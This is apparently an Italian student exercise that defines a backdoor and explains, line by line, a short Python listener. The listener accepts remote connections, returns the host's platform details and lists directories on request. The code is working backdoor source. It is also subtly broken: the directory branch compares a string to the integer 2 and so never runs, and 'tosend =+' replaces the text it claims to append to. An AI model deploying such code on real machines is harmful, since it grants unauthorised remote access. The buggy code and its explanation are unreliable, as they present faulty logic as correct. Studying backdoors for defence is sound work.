# S3_L4

spiegare questo codice che fa riferimento ad una backdoor e spiegare cos’è una backdoor.
Una backdoor è un accesso non autorizzato a un sistema che bypassa i suoi controlli di sicurezza e rimane nascosta cosi da monitorare l attivita degli utenti e rubare dati.
Spiegazione codice:

# questo comando serve a importare varie librerie
import socket, platform, os

# creazione delle variabili di un indirizzo IP e di una porta su cui mettere il sevizio in ascolto
SRV_ADDR = ""
SRV_PORT = 1234

# creazione di un socket IP TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# associazione del socket all indirizzo e alla porta
s.bind((SRV_ADDR, SRV_PORT))

# configurazione del socket per ascoltare
s.listen(1)

# accetttare e stabilire la connessione
connection, address = s.accept()

# messaggio che il client è connesso
print ("client connected: ", address)

# ciclo principale
while 1:
    try:
        # ricezione dei dati
        data = connection.recv(1024)
        
        #se c'è un errore con la ricezione il ciclo continua
    except:continue

    # condizione se i dati ricevuti sono 1 allora invia informazioni sulla piatta forma del client
    if(data.decode('utf-8') == '1'):
        tosend = platform.platform() + " " + platform.machine()
        connection.sendall(tosend.encode())
        
    # condizione se i dati ricevuti sono 2 allora elenca i file nella directory specificata 
    elif(data.decode('utf-8') == 2):
        data = connection.recv(1024)
        try:
            # si ottiene la lista dei file
            filelist = os.listdir(data.decode('utf-8'))
            tosend = ""
            
            # conversione della lista dei file separati da virgole
            for x in filelist:
                tosend =+ "," + x

        #  se si verrifica un errore invia un messaggio di errore   
        except:
            tosend = "Wrong path"
        connection.sendall(tosend.encode())

    #se i dati sono 0 si chiude la connessione e ne accetta una nuova
    elif(data.decode('utf-8') == '0'):
        connection.close()
        connection, address = s.accept()      

